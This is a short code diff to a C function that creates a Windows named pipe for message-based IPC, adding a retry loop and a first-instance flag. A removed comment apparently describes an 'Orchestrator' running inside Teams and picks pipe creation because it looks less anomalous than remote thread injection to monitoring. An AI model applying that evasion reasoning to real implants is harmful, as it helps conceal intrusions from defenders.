@@ -54,27 +54,30 @@ HANDLE IPC_CreateServerPipe(DWORD dwAtomId) {
     WCHAR szPipeName[128];
     wsprintfW(szPipeName, PIPE_NAME_FORMAT, dwAtomId);
 
-    /* 
-     * Using standard API for now as NtCreateNamedPipeFile is highly complex.
-     * Since this is the Orchestrator running in a trusted host (Teams),
-     * pipe creation is less anomalous than remote thread injection.
-     */
-    HANDLE hPipe = CreateNamedPipeW(
-        szPipeName,
-        PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED,  /* Wait / Overlapped */
-        PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
-        1,              /* Max instances - 1 per Atom */
-        MAX_IPC_PAYLOAD_SIZE + sizeof(IPC_MESSAGE), /* Out buffer */
-        MAX_IPC_PAYLOAD_SIZE + sizeof(IPC_MESSAGE), /* In buffer */
-        0,              /* Default timeout */
-        NULL            /* Default security attributes */
-    );
+    HANDLE hPipe = INVALID_HANDLE_VALUE;
+    int retries = 3;
+    
+    while (retries > 0) {
+        hPipe = CreateNamedPipeW(
+            szPipeName,
+            PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED | FILE_FLAG_FIRST_PIPE_INSTANCE, 
+            PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
+            1, MAX_IPC_PAYLOAD_SIZE + sizeof(IPC_MESSAGE), 
+            MAX_IPC_PAYLOAD_SIZE + sizeof(IPC_MESSAGE), 0, NULL
+        );
 
-    if (hPipe == INVALID_HANDLE_VALUE) {
-        return NULL;
+        if (hPipe != INVALID_HANDLE_VALUE) break;
+        
+        if (GetLastError() == ERROR_ACCESS_DENIED) {
+            /* Pipe exists from an old crashed instance, wait for it to die */
+            Sleep(1000);
+            retries--;
+        } else {
+            break;
+        }
     }
 
-    return hPipe;
+    return (hPipe == INVALID_HANDLE_VALUE) ? NULL : hPipe;
 }
 
 /*---------------------------------------------------------------------------
